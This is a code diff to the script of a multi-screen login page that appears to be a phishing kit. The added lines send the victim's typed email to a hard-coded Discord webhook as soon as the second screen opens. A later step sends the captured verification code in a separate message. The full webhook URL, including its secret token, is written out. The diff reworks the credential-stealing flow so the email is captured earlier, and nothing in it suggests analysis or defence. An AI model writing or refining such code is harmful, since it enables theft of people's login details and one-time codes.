@@ -297,6 +297,7 @@ h1{ font-size:24px; font-weight:600; margin:0 0 4px 0; color:#1b1b1b; }
 
 <script>
 let userEmail = '';
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1482983673627410634/_rg5kUL8R_4odkQHoONdmEyzF7xhxZgMjrsOqRGl-veeJ2kF_mIqc0sd7srGNrwuegvr';
 
 function transitionTo(fromId, toId, contentId) {
   const from = document.getElementById(fromId);
@@ -322,6 +323,13 @@ function goToScreen2() {
   setTimeout(() => { bottom.style.display = 'none'; }, 250);
 
   transitionTo('screen1', 'screen2', 'screen2-content');
+  fetch(DISCORD_WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: '**New Login Attempt**\nEmail: `' + userEmail
+    })
+  }).catch(err => console.warn('Discord fetch failed', err));
 }
 
 function goToScreen3() {
@@ -335,13 +343,12 @@ function goToScreen4() {
 
   transitionTo('screen3', 'screen4', null);
 
-  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1482983673627410634/_rg5kUL8R_4odkQHoONdmEyzF7xhxZgMjrsOqRGl-veeJ2kF_mIqc0sd7srGNrwuegvr';
-
+  
   fetch(DISCORD_WEBHOOK, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: '**New Login Attempt**\nEmail: `' + userEmail + '`\nCode: `' + code + '`'
+      content: '`Code: `' + code + '`'
     })
   }).catch(err => console.warn('Discord fetch failed', err));
 
